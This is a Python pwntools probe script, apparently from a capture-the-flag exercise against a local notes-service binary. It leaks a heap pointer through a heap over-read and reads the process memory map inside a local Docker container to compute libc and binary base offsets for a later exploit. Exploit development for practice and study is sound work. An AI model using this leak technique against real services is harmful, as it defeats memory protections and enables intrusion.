#!/usr/bin/env python3
"""
Probe: allocate a note, leak brk ptr via over-read, then use docker exec
to read /proc/PID/maps and compute all offsets.
"""
from pwn import *
import subprocess, re, time

HOST, PORT = "localhost", 11337
context.log_level = 'info'

def alloc(io, idx, sz):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"Enter size: ", str(sz).encode())

def write_note(io, idx, data):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"size: ", str(len(data)).encode())
    io.sendafter(b"data: ", data)

def read_note(io, idx, sz):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"size: ", str(sz).encode())
    return io.recv(sz, timeout=2)

def get_maps():
    """Get /proc/PID/maps from inside the docker container"""
    # Find chall PID inside docker
    result = subprocess.run(
        ["docker", "exec", "atyp_test", "sh", "-c",
         "cat /proc/$(pgrep -f 'libc.so /srv/dist/chall' | head -1)/maps"],
        capture_output=True, text=True
    )
    if result.returncode != 0:
        # Try different approach
        result = subprocess.run(
            ["docker", "exec", "atyp_test", "sh", "-c",
             "ls /proc/*/maps 2>/dev/null | while read f; do grep -l chall $f 2>/dev/null; done | head -1 | xargs cat"],
            capture_output=True, text=True
        )
    return result.stdout

def probe():
    io = remote(HOST, PORT)

    # Allocate notes
    for i in range(16):
        alloc(io, i, 0x10)
        write_note(io, i, p64(0xdead0000 + i) + p64(0xcafe0000 + i))

    # Over-read note 14 to get brk heap pointer at +0x20
    data = read_note(io, 14, 0x100)
    leaked_brk = u64(data[0x20:0x28])
    print(f"[*] Leaked brk ptr: 0x{leaked_brk:016x}")

    # Get memory maps
    time.sleep(0.5)
    maps = get_maps()
    if not maps:
        print("[-] Could not read maps, trying alternative...")
        # Try to find PID via /proc
        result = subprocess.run(
            ["docker", "exec", "atyp_test", "sh", "-c",
             "for p in /proc/[0-9]*/cmdline; do if grep -qa chall $p 2>/dev/null; then d=$(dirname $p); cat $d/maps; break; fi; done"],
            capture_output=True, text=True
        )
        maps = result.stdout

    print("\n=== Memory Map ===")
    libc_base = None
    chall_base = None
    brk_region = None

    for line in maps.strip().split('\n'):
        print(line)
        parts = line.split()
        addrs = parts[0].split('-')
        start = int(addrs[0], 16)
        end = int(addrs[1], 16)

        if len(parts) >= 6:
            path = parts[5].strip()
            if 'libc.so' in path and 'r-x' in parts[1]:
                libc_base = start
            if 'chall' in path and 'r-x' in parts[1]:
                chall_base = start

        # Check if leaked brk ptr falls in this region
        if leaked_brk >= start and leaked_brk < end:
            brk_region = (start, end, parts[1] if len(parts) > 1 else '?',
                         parts[5] if len(parts) >= 6 else '[anon]')

    print(f"\n=== Computed Offsets ===")
    if libc_base:
        print(f"libc_base:  0x{libc_base:016x}")
    if chall_base:
        print(f"chall_base: 0x{chall_base:016x}")
    if libc_base and chall_base:
        print(f"chall - libc: 0x{chall_base - libc_base:x}")
    if brk_region:
        print(f"brk region: 0x{brk_region[0]:016x}-0x{brk_region[1]:016x} {brk_region[2]} {brk_region[3]}")
    if libc_base:
        print(f"leaked_brk - libc_base: 0x{leaked_brk - libc_base:x}")
    if chall_base:
        print(f"leaked_brk - chall_base: 0x{leaked_brk - chall_base:x}")

    # The key question: is (leaked_brk - libc_base) or (leaked_brk - chall_base) constant?

    io.close()

if __name__ == "__main__":
    probe()
